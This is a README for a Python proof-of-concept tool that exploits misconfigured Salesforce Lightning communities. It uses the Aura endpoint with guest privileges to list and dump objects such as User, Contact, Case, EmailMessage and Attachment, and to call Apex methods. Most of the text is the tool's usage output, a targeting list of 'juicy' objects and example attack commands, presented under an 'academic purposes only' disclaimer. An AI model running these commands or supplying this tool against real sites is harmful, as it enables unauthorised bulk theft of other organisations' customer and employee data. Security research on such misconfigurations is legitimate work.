# PoC for Salesforce lightning
***Academic purposes Only***. 


This tool dumps the data of Salesforce object through Aura lightning endpoint with the guest privilege.


雑なコードだけど許してくれい => I tried to address some of that


# Requirement
- Python3 

# Usage
```
$ python3 exploit.py -h
usage: exploit.py [-h] -u URL [-o [OBJECTS ...]] [-l] [-c] [-a AURA_ENDPOINT_CONFIG] [-r RECORD_ID] [-d] [-f] [-s] [-p] [-e] [-x]

Exploit Salesforce through the aura endpoint with the guest privilege

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     set the SITE url. e.g. http://url/site_path
  -o [OBJECTS ...], --objects [OBJECTS ...]
                        set the object name. Default value is "User" object. Juicy Objects:
                        Case,Account,User,Contact,Document,ContentDocument,ContentVersion,ContentBody,CaseComment,Note,Employee,Attachment,EmailMessage,CaseExternalDocument,Attachment,Lead,Name,EmailTemplate,EmailMessageRelation
  -l, --listobj         pull the object list.
  -c, --check           only check aura endpoint
  -a AURA_ENDPOINT_CONFIG, --aura_endpoint_config AURA_ENDPOINT_CONFIG
                        set your valid aura_endpoint_config
  -r RECORD_ID, --record_id RECORD_ID
                        set the recode id to dump the record
  -d, --dump_objects    dump a small number of objects accessible to guest users and saves them in the file.
  -f, --full            if set with -d, dump all pages of objects.
  -s, --skip            if set with -d, skip the objects already dumped.
  -p, --pull_custom_components
                        if set will load component definitions
  -e, --extract_apex_methods
                        Extracts Apex methods from custom components
  -x, --execute_apex    Calls an Apex Method. Details must be changed in exploit.py for now
```

# Examples 
```
# just list objects
$ python3 exploit.py -u https://domain.force.com/path/ -l

# show User and Account object
$ python3 exploit.py -u https://domain.force.com/path/ -o User Account

# save all objects(only page 1)
$ python3 exploit.py -u https://domain.force.com/path/ -d -s
```

# Reference
- Salesforce Lightning - An in-depth look at exploitation vectors for the everyday community
  - https://www.enumerated.de/index/salesforce (404), use https://web.archive.org/web/20201031233746/https://www.enumerated.de/index/salesforce
